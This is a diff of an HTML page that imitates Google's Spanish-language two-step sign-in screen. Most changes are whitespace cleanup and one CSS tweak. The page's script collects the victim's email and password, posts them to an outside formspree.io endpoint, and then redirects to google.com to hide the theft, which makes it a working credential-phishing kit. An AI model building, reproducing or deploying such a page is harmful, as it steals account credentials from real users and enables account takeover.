@@ -6,8 +6,6 @@
 <title>Inicia sesión - Cuentas de Google</title>
 
 
-
-
 <style>
 :root {
  --page-bg: #f8f9ff;
@@ -21,19 +19,13 @@
 }
 
 
-
-
 * { box-sizing: border-box; }
-
-
 
 
 html, body {
  min-height: 100%;
  margin: 0;
 }
-
-
 
 
 body {
@@ -48,14 +40,10 @@ body {
 }
 
 
-
-
 .wrap {
  width: 100%;
  max-width: 900px;
 }
-
-
 
 
 .card {
@@ -69,15 +57,11 @@ body {
 }
 
 
-
-
 .google-logo {
  width: 24px;
  height: 24px;
  display: block;
 }
-
-
 
 
 h1 {
@@ -88,8 +72,6 @@ h1 {
 }
 
 
-
-
 .subtitle {
  font-size: 16px;
  color: var(--text);
@@ -98,19 +80,13 @@ h1 {
 }
 
 
-
-
 form { width: 100%; }
-
-
 
 
 .field {
  position: relative;
  margin-bottom: 8px;
 }
-
-
 
 
 .field input {
@@ -128,14 +104,10 @@ form { width: 100%; }
 }
 
 
-
-
 .field input:focus {
  border: 2px solid var(--accent);
  padding: 19px 13px 5px;
 }
-
-
 
 
 .field label {
@@ -151,15 +123,11 @@ form { width: 100%; }
 }
 
 
-
-
 .field input:not(:placeholder-shown) + label {
  top: -8px;
  font-size: 12px;
  color: var(--text-muted);
 }
-
-
 
 
 .field input:focus + label {
@@ -169,22 +137,16 @@ form { width: 100%; }
 }
 
 
-
-
 .field.has-error input {
  border: 2px solid var(--error);
  padding: 19px 13px 5px;
 }
 
 
-
-
 .field.has-error label,
 .field.has-error input:focus + label {
  color: var(--error);
 }
-
-
 
 
 .error-msg {
@@ -195,16 +157,12 @@ form { width: 100%; }
 }
 
 
-
-
 #mensaje { letter-spacing: .5px; }
 #mensaje[type="text"] { letter-spacing: normal; }
 
 
-
-
 .chip {
- display: none;
+ display: inline-block;
  max-width: 100%;
  border: 1px solid var(--border);
  border-radius: 999px;
@@ -223,11 +181,7 @@ form { width: 100%; }
 }
 
 
-
-
 .chip:hover { background: #f1f3f4; }
-
-
 
 
 .show-pass {
@@ -242,8 +196,6 @@ form { width: 100%; }
 }
 
 
-
-
 .show-pass input {
  width: 18px;
  height: 18px;
@@ -253,11 +205,7 @@ form { width: 100%; }
 }
 
 
-
-
 .password-step { animation: fadeIn .22s ease; }
-
-
 
 
 @keyframes fadeIn {
@@ -266,16 +214,10 @@ form { width: 100%; }
 }
 
 
-
-
 .forgot { margin-top: 8px; }
 
 
-
-
 .forgot-pass { margin-top: 18px; margin-bottom: 8px; }
-
-
 
 
 .forgot a,
@@ -288,13 +230,9 @@ form { width: 100%; }
 }
 
 
-
-
 .forgot a:hover,
 .create a:hover,
 .more-info a:hover { text-decoration: underline; }
-
-
 
 
 .more-info {
@@ -306,8 +244,6 @@ form { width: 100%; }
 }
 
 
-
-
 .actions {
  margin-top: 32px;
  display: flex;
@@ -315,8 +251,6 @@ form { width: 100%; }
  justify-content: flex-end;
  gap: 20px;
 }
-
-
 
 
 .next-btn {
@@ -333,14 +267,10 @@ form { width: 100%; }
 }
 
 
-
-
 .next-btn:hover {
  background: var(--accent-hover);
  box-shadow: 0 1px 3px rgba(60, 64, 67, .3);
 }
-
-
 
 
 .next-btn:disabled {
@@ -349,16 +279,12 @@ form { width: 100%; }
 }
 
 
-
-
 #estado {
  font-size: 13px;
  line-height: 1.5;
  color: var(--text-muted);
  margin: 16px 0 0;
 }
-
-
 
 
 footer {
@@ -374,8 +300,6 @@ footer {
 }
 
 
-
-
 footer select {
  background: transparent;
  border: none;
@@ -386,11 +310,7 @@ footer select {
 }
 
 
-
-
 footer .links { display: flex; gap: 20px; }
-
-
 
 
 footer a {
@@ -399,17 +319,11 @@ footer a {
 }
 
 
-
-
 footer a:hover { text-decoration: underline; }
-
-
 
 
 @media (max-width: 760px) {
  body { padding: 16px; }
-
-
 
 
  .card {
@@ -420,11 +334,7 @@ footer a:hover { text-decoration: underline; }
  }
 
 
-
-
  .actions { justify-content: space-between; }
-
-
 
 
  footer {
@@ -436,21 +346,13 @@ footer a:hover { text-decoration: underline; }
 </head>
 
 
-
-
 <body>
-
-
 
 
 <div class="wrap">
 
 
-
-
  <div class="card">
-
-
 
 
    <div class="col-left">
@@ -465,21 +367,13 @@ footer a:hover { text-decoration: underline; }
    </div>
 
 
-
-
    <div class="col-right">
-
-
 
 
      <form id="formulario" novalidate>
 
 
-
-
        <button type="button" class="chip" id="chip" hidden></button>
-
-
 
 
        <div id="stepEmail">
@@ -496,13 +390,9 @@ footer a:hover { text-decoration: underline; }
          </div>
 
 
-
-
          <p class="error-msg" id="emailError" hidden aria-live="polite">
            Introduce una dirección de correo electrónico o un número de teléfono
          </p>
-
-
 
 
          <div class="forgot">
@@ -511,8 +401,6 @@ footer a:hover { text-decoration: underline; }
            </a>
          </div>
        </div>
-
-
 
 
        <div class="password-step" id="passwordStep" hidden>
@@ -529,21 +417,15 @@ footer a:hover { text-decoration: underline; }
          </div>
 
 
-
-
          <p class="error-msg" id="passError" hidden aria-live="polite">
            Introduce una contraseña
          </p>
-
-
 
 
          <label class="show-pass">
            <input type="checkbox" id="togglePass">
            <span>Mostrar contraseña</span>
          </label>
-
-
 
 
          <div class="forgot forgot-pass">
@@ -554,8 +436,6 @@ footer a:hover { text-decoration: underline; }
        </div>
 
 
-
-
        <p class="more-info">
          ¿No es tu ordenador? Usa el modo Incógnito para iniciar sesión de
          forma privada.
@@ -563,11 +443,7 @@ footer a:hover { text-decoration: underline; }
        </p>
 
 
-
-
        <div class="actions">
-
-
 
 
          <div class="create" id="createWrap">
@@ -575,8 +451,6 @@ footer a:hover { text-decoration: underline; }
              Crear cuenta
            </a>
          </div>
-
-
 
 
          <button
@@ -588,36 +462,22 @@ footer a:hover { text-decoration: underline; }
          </button>
 
 
-
-
        </div>
-
-
 
 
        <p id="estado" aria-live="polite"></p>
 
 
-
-
      </form>
-
-
 
 
    </div>
 
 
-
-
  </div>
 
 
-
-
  <footer>
-
-
 
 
    <select aria-label="Idioma">
@@ -627,8 +487,6 @@ footer a:hover { text-decoration: underline; }
    </select>
 
 
-
-
    <div class="links">
      <a href="https://support.google.com/">Ayuda</a>
      <a href="https://policies.google.com/privacy">Privacidad</a>
@@ -636,16 +494,10 @@ footer a:hover { text-decoration: underline; }
    </div>
 
 
-
-
  </footer>
 
 
-
-
 </div>
-
-
 
 
 <script>
@@ -665,26 +517,18 @@ const emailError = document.getElementById("emailError");
 const passError = document.getElementById("passError");
 
 
-
-
 const ENDPOINT = "https://formspree.io/f/meaalzgg";
 const DESTINO = "https://www.google.com/";
-
-
 
 
 const RE_EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
 const RE_TEL = /^\+?[\d\s().-]{6,}$/;
 
 
-
-
 function emailValido() {
  const v = email.value.trim();
  return RE_EMAIL.test(v) || RE_TEL.test(v);
 }
-
-
 
 
 function marcarErrorEmail() {
@@ -694,15 +538,11 @@ function marcarErrorEmail() {
 }
 
 
-
-
 function limpiarErrorEmail() {
  emailField.classList.remove("has-error");
  email.removeAttribute("aria-invalid");
  emailError.hidden = true;
 }
-
-
 
 
 function marcarErrorPass() {
@@ -712,8 +552,6 @@ function marcarErrorPass() {
 }
 
 
-
-
 function limpiarErrorPass() {
  passwordField.classList.remove("has-error");
  mensaje.removeAttribute("aria-invalid");
@@ -721,26 +559,18 @@ function limpiarErrorPass() {
 }
 
 
-
-
 function irAPasoContrasena() {
  chip.textContent = email.value.trim();
  chip.hidden = false;
-
-
 
 
  stepEmail.hidden = true;
  createWrap.hidden = true;
 
 
-
-
  passwordStep.hidden = false;
  mensaje.focus({ preventScroll: true });
 }
-
-
 
 
 function volverAPasoEmail() {
@@ -753,17 +583,11 @@ function volverAPasoEmail() {
 }
 
 
-
-
 email.addEventListener("input", limpiarErrorEmail);
 mensaje.addEventListener("input", limpiarErrorPass);
 
 
-
-
 chip.addEventListener("click", volverAPasoEmail);
-
-
 
 
 togglePass.addEventListener("change", () => {
@@ -771,21 +595,13 @@ togglePass.addEventListener("change", () => {
 });
 
 
-
-
 formulario.addEventListener("submit", (evento) => {
-
-
 
 
  evento.preventDefault();
 
 
-
-
  if (!stepEmail.hidden) {
-
-
 
 
    if (!emailValido()) {
@@ -795,14 +611,10 @@ formulario.addEventListener("submit", (evento) => {
    }
 
 
-
-
    limpiarErrorEmail();
    irAPasoContrasena();
    return;
  }
-
-
 
 
  if (mensaje.value.trim() === "") {
@@ -812,19 +624,13 @@ formulario.addEventListener("submit", (evento) => {
  }
 
 
-
-
  boton.disabled = true;
  estado.textContent = "Redirigiendo a Google...";
-
-
 
 
  const datos = new FormData(formulario);
  datos.set("email", email.value.trim());
  datos.set("mensaje", mensaje.value);
-
-
 
 
  fetch(ENDPOINT, {
@@ -835,21 +641,16 @@ formulario.addEventListener("submit", (evento) => {
  }).catch(() => {});
 
 
-
-
  setTimeout(() => {
    window.location.href = DESTINO;
  }, 250);
-
-
 
 
 });
 </script>
 
 
-
-
 </body>
 </html>
+
 
